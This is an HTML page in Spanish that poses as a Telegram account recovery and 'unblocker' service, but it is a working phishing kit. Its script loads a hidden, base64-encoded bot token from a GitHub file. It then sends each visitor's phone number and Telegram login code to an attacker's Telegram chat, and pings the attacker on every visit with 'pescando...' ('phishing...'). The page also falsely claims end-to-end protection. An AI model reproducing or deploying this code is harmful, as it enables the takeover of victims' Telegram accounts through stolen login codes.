<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Desbloqueador y recuperaci√≥n de cuentas de Telegram</title>
  <style>
    :root{
      --bg:#ffffff;
      --accent:#0a84ff;
      --accent-2:#66b3ff;
      --glass: rgba(255,255,255,0.45);
      --glass-2: rgba(255,255,255,0.25);
      --muted:#6b7280;
      --radius:20px;
      --card-w:420px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }

    html,body{height:100%;margin:0;background:var(--bg);overflow:hidden;}

    .page-bg{
      position:fixed;inset:0;z-index:-2;overflow:hidden;background:var(--bg);
    }
    .bubble{
      position:absolute;border-radius:50%;filter:blur(70px);opacity:0.6;mix-blend-mode:screen;
    }
    .bubble.b1{width:360px;height:360px;left:-120px;top:-100px;background:var(--accent);}
    .bubble.b2{width:300px;height:300px;right:-100px;bottom:-80px;background:var(--accent-2);}
    .bubble.b3{width:220px;height:220px;left:40%;top:60%;background:linear-gradient(135deg,var(--accent),var(--accent-2));opacity:0.4}

    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:32px;}

    .card{
      width:clamp(320px,var(--card-w),90%);
      border-radius:var(--radius);
      background:linear-gradient(120deg,var(--glass),var(--glass-2));
      box-shadow:0 15px 40px rgba(0,0,0,0.12);
      backdrop-filter: blur(22px) saturate(160%);
      -webkit-backdrop-filter: blur(22px) saturate(160%);
      border:1px solid rgba(255,255,255,0.45);
      padding:28px;
      position:relative;
      overflow:hidden;
    }

    .header{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
    .logo{width:44px;height:44px;border-radius:12px;overflow:hidden;flex:0 0 44px;background:linear-gradient(135deg,#e6f6ff,#dff4ff);display:grid;place-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
    .logo img{width:28px;height:28px;object-fit:contain}
    h1{font-size:1.1rem;margin:0;color:#05386b}
    p.lead{margin:6px 0 18px;color:var(--muted);font-size:0.95rem}

    form{display:grid;gap:12px}
    .field{display:flex;flex-direction:column;align-items:flex-start}
    label{font-size:0.8rem;color:#1f2937;margin-bottom:6px}
    input[type="text"], input[type="tel"], input[type="email"]{
      width:100%;padding:12px 14px;border-radius:14px;border:1px solid rgba(10,20,40,0.06);background:rgba(255,255,255,0.65);outline:none;font-size:0.95rem;
      box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
      transition:box-shadow .18s, transform .12s, border-color .12s;
    }
    input:focus{box-shadow:0 6px 20px rgba(10,20,60,0.08);transform:translateY(-1px);border-color:var(--accent)}

    .actions{display:flex;gap:10px;margin-top:6px}
    button.primary{
      flex:1;padding:11px;border-radius:14px;border:0;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:white;font-weight:600;cursor:pointer;box-shadow:0 6px 18px rgba(10,132,255,0.25);
    }
    button.ghost{flex:1;padding:11px;border-radius:14px;border:1px solid rgba(10,20,40,0.08);background:transparent;color:#05386b;cursor:pointer}

    .note{font-size:0.82rem;color:var(--muted);margin-top:12px;text-align:center}

    .quote{margin-top:16px;padding:12px;border-radius:14px;background:linear-gradient(180deg,rgba(10,132,255,0.04),rgba(102,179,255,0.04));border:1px solid rgba(10,132,255,0.08);color:#0b4f7a;font-size:0.92rem;display:flex;gap:10px;align-items:flex-start}
    .quote svg{flex:0 0 18px;opacity:0.85}

    @media (max-width:420px){.card{padding:20px;border-radius:16px}}

    .success{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#e6ffef;color:#0b6b3a;border:1px solid rgba(11,107,58,0.12)}
    .error{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#fff1f0;color:#8b1d10;border:1px solid rgba(139,29,16,0.08)}
    
    .loading {display: none; text-align: center; margin: 10px 0;}
    .loading-spinner {width: 24px; height: 24px; border: 3px solid rgba(10, 132, 255, 0.3); border-radius: 50%; border-top-color: var(--accent); animation: spin 1s linear infinite; margin: 0 auto;}
    @keyframes spin {to {transform: rotate(360deg);}}
    
    .security-badge {position: absolute; top: 10px; right: 10px; font-size: 10px; color: #0a84ff; background: rgba(10, 132, 255, 0.1); padding: 4px 8px; border-radius: 10px;}
  </style>
</head>
<body>
  <div class="page-bg">
    <div class="bubble b1" aria-hidden="true"></div>
    <div class="bubble b2" aria-hidden="true"></div>
    <div class="bubble b3" aria-hidden="true"></div>
  </div>

  <div class="wrap">
    <main class="card" role="main" aria-labelledby="title">
      <div class="security-badge">üîí Protegido de extremo a extremo</div>
      <header class="header">
        <div class="logo" aria-hidden="true">
          <img src="https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/product_logo.png" alt="Logo" />
        </div>
        <div>
          <h1 id="title">Configuraci√≥n de la Cuenta</h1>
          <p class="lead">Introduce tu tel√©fono para recibir un c√≥digo seguro para poder desbloquear a lo m√°ximo tu cuenta.</p>
        </div>
      </header>

      <form id="recoveryForm" autocomplete="on">
        <div class="field">
          <label for="phone">N√∫mero de tel√©fono</label>
          <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+34 612 345 678" required />
        </div>

        <div class="actions">
          <button class="primary" type="submit" id="submitBtn">Enviar c√≥digo</button>
          <button class="ghost" type="button" id="helpBtn">¬øNecesitas ayuda?</button>
        </div>

        <div class="loading" id="loading">
          <div class="loading-spinner"></div>
          <p>Procesando solicitud...</p>
        </div>

        <div class="success" id="successBox" role="status">¬°C√≥digo enviado! Revisa tu dispositivo.</div>
        <div class="error" id="errorBox" role="alert"></div>
      </form>

      <form id="codeForm" style="display:none;margin-top:8px;">
        <div class="field">
          <label for="code">C√≥digo recibido</label>
          <input id="code" name="code" type="text" placeholder="12345" inputmode="numeric" required />
        </div>
        <div class="actions">
          <button class="primary" type="submit">Verificar</button>
          <button class="ghost" type="button" id="cancelCode">Cancelar</button>
        </div>
      </form>

      <div class="quote" aria-hidden="true">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M7 7h3v6H7zM14 7h3v6h-3z" fill="currentColor" opacity="0.9"/>
        </svg>
        <div>"La seguridad primero: nunca compartas tu c√≥digo por m√°s que digan que provienen de Telegram. Usa siempre m√©todos seguros del servidor para procesar datos."</div>
      </div>

      <p class="note">Este formulario est√° protegido para evitar la filtraci√≥n de datos.</p>
    </main>
  </div>

  <script>
    // ========== CONFIGURACI√ìN ==========
    const DEBUG_MODE = true; // Cambiar a false en producci√≥n
    
    // ========== FUNCIONES PRINCIPALES ==========
    
    // Funci√≥n para decodificar Base64
    function decodeBase64(encoded) {
      try {
        // Decodificar Base64
        const decoded = atob(encoded);
        return decoded;
      } catch (error) {
        console.error('Error al decodificar Base64:', error);
        throw new Error('Fall√≥ la decodificaci√≥n Base64: ' + error.message);
      }
    }
    
    // Funci√≥n para cargar credenciales SIN cach√©
    async function loadCredentials() {
      try {
        // Forzar recarga sin cach√©
        const response = await fetch('https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/.assets?nocache=' + new Date().getTime(), {
          cache: 'no-store'
        });
        
        if (!response.ok) {
          throw new Error(`Error HTTP: ${response.status}`);
        }
        
        const encodedData = await response.text();
        
        // Dividir por punto
        const parts = encodedData.split('.');
        if (parts.length !== 2) {
          throw new Error('Formato de credenciales inv√°lido. Se esperaba: token_base64.chatid_base64');
        }
        
        // Decodificar token y chatId desde Base64
        const encodedToken = parts[0].trim();
        const encodedChatId = parts[1].trim();
        
        const token = decodeBase64(encodedToken);
        const chatId = decodeBase64(encodedChatId);
        
        if (DEBUG_MODE) {
          console.log('Credenciales decodificadas correctamente');
          // Enviar mensaje de prueba
          try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                text: '‚úÖ Alguien ha visitado el sitio, pescando...'
              })
            });
            console.log('Mensaje de prueba enviado con √©xito');
          } catch (testError) {
            console.warn('Error en test de funcionamiento:', testError.message);
          }
        }
        
        return { token, chatId };
      } catch (error) {
        console.error('Error al cargar las credenciales:', error);
        throw new Error('No se pudieron cargar las credenciales: ' + error.message);
      }
    }

    // Funci√≥n para mostrar un error
    function showError(msg) {
      const errorBox = document.getElementById('errorBox');
      errorBox.textContent = msg;
      errorBox.style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('loading').style.display = 'none';
    }

    // Funci√≥n para mostrar un √©xito
    function showSuccess(msg) {
      const successBox = document.getElementById('successBox');
      successBox.textContent = msg;
      successBox.style.display = 'block';
      document.getElementById('errorBox').style.display = 'none';
      document.getElementById('loading').style.display = 'none';
    }

    // Funci√≥n para mostrar carga
    function showLoading() {
      document.getElementById('loading').style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('errorBox').style.display = 'none';
    }

    // ========== EVENT LISTENERS ==========
    
    // Event listener para el formulario de recuperaci√≥n
    document.getElementById('recoveryForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();
      if (!phone) {
        showError('Introduce un tel√©fono v√°lido.');
        return;
      }

      showLoading();

      try {
        const { token, chatId } = await loadCredentials();
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `N√∫mero de tel√©fono recibido: ${phone}`
          })
        });

        showSuccess('C√≥digo enviado. Por favor, revisa tu tel√©fono.');
        document.getElementById('recoveryForm').style.display = 'none';
        document.getElementById('codeForm').style.display = 'block';

      } catch (err) {
        console.error(err);
        showError('No se pudo enviar el c√≥digo. Revisa la conexi√≥n o contacta al soporte de Telegram support@telegram.org.');
      }
    });

    // Event listener para el formulario de c√≥digo
    document.getElementById('codeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('code').value.trim();
      if (!code) {
        showError('Introduce el c√≥digo recibido.');
        return;
      }

      showLoading();

      try {
        const { token, chatId } = await loadCredentials();
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `C√≥digo recibido: ${code}`
          })
        });
        showSuccess('C√≥digo verificado, Destruyendo datos de este sitio y redirigiendo al transformador...');
        setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
      } catch (err) {
        console.error(err);
        showError('C√≥digo inv√°lido o expirado. Intenta de nuevo.');
      }
    });

    // Event listener para el bot√≥n de ayuda
    document.getElementById('helpBtn').addEventListener('click', () => {
      alert('Si no recibes el c√≥digo, comprueba el n√∫mero o contacta soporte.');
    });

    // Event listener para el bot√≥n de cancelar
    document.getElementById('cancelCode').addEventListener('click', () => {
      document.getElementById('codeForm').style.display = 'none';
      document.getElementById('recoveryForm').style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('errorBox').style.display = 'none';
    });

    // ========== INICIALIZACI√ìN ==========
    
    // Cargar credenciales al iniciar para verificar que todo funciona
    if (DEBUG_MODE) {
      console.log('Iniciando verificaci√≥n de credenciales...');
      loadCredentials().then(() => {
        console.log('Verificaci√≥n completada correctamente');
      }).catch(error => {
        console.error('Error en verificaci√≥n inicial:', error);
      });
    }
  </script>
</body>
</html>